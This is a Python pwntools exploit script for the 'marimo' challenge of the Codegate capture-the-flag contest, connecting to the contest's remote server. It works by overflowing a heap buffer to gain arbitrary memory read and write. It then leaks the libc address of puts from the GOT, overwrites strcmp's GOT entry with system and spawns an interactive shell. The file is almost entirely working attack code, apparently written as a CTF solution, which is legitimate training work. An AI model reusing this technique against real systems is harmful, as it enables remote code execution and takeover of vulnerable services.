from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./marimo"

libc = ELF("libc.so.6")
bin = ELF(file)

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
#conn = process(file, env=env)
#gdb.attach(conn)

conn = remote("ch41l3ng3s.codegate.kr", 3333)

def menu(choice):
    conn.recvuntil("[Q]uit")
    conn.recvuntil(">> ")
    conn.sendline(choice)

def create_marimo(name, profile):
    conn.recvuntil("name? (0x10)")
    conn.sendline(name)
    conn.recvuntil("'s profile.")
    conn.sendline(profile)
    conn.recvuntil(">> ")

def create(name, profile):
    menu("show me the marimo")
    create_marimo(name, profile)

def buy(name, profile, size):
    menu("B")
    conn.recvuntil("want for Marimo? (cm)")
    conn.sendline(str(size))
    conn.recvuntil("Give me money")
    conn.sendline("P")
    create_marimo(name, profile)

def sell(idx):
    menu("S")
    conn.recvuntil("sell? (number)")
    conn.sendline(str(idx))
    conn.recvuntil("un away ?")
    conn.sendline("S")
    conn.recvuntil("good bye marimo T-T")

def view(idx):
    menu("V")
    conn.recvuntil("Select number or [B]ack")
    conn.sendline(str(idx))

def back():
    conn.recvuntil("[M]odify /")
    conn.sendline("B")

def modify(profile):
    conn.recvuntil("[M]odify /")
    conn.sendline("M")
    conn.recvuntil("new profile")
    conn.sendline(profile)

create("name1", "profile1")
create("name2", "profile2")

sleep(2)

def a_read(addr):
    view(0)
    payload = "a"*8*4 + \
              p64(0) + \
              p64(0x21) + \
              p32(0xffff) + p32(0xaaaa) + \
              p64(0) + \
              p64(addr)
    modify(payload)
    back()
    view(1)
    conn.recvuntil("profile : ")

def a_write(addr, data):
    view(0)
    payload = "a"*8*4 + \
              p64(0) + \
              p64(0x21) + \
              p32(0xffff) + p32(0xaaaa) + \
              p64(0) + \
              p64(addr)
    modify(payload)
    back()
    view(1)
    modify(data)
    back()

a_read(bin.got['puts'])
puts_addr = u64(conn.recvn(6) + "\x00\x00")
back()

system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr
bin_sh_addr = next(libc.search("/bin/sh")) - libc.symbols['puts'] + puts_addr

rip = 0xdeadbeef
a_write(bin.got['strcmp'], p64(system_addr)[:-1])

conn.sendline("/bin/sh")
#create("name3", "profile2")

log.info("System addr: " + hex(system_addr))

conn.interactive()
